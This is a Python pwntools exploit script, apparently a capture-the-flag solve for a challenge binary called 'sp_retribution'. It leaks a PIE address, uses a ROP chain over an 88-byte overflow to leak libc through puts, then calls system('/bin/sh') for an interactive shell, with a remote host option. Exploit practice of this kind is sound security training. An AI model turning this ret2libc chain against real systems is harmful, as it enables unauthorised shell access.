!/home/gh0st69/.venv/bin/python

from pwn import *
import os

os.system("clear")

elf = context.binary = ELF("sp_retribution", checksec=False)
libc = ELF("glibc/libc.so.6", checksec=False)

context.terminal = ["kitty", "-e"]

gs = '''
continue
'''

def exploit():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(*(sys.argv[1].split(":")))
    else:
        return process(elf.path)

io = exploit()

io.sendlineafter(b">>", b"2")
io.sendlineafter(b"y = ", b'AAAAAAA')

io.recvline()
io.recvline()
io.recvline()
io.recvline()
r = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked: 0x{r:02x}')

elf.address = r - 0xd70
log.success(f'leaked_elf_base: 0x{elf.address:02x}')

rop = ROP(elf)

offset = 88


rop = ROP(elf)

offset = 88
junk = b'A' * offset

payload  = junk
payload += p64(rop.rdi[0])
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym.missile_launcher)

io.sendlineafter(b"(y/n): ", payload)

io.recvline()
io.recvline()

r = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked_puts_addr: 0x{r:02x}')

libc.address = r - libc.sym.puts 
log.success(f'leaked_libc_base: 0x{libc.address:02x}')

io.sendlineafter(b"y = ", b"AAAAAAA")

payload = junk
payload += p64(rop.rdi[0])
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym.system)

io.sendlineafter(b"(y/n): ", payload)

io.interactive()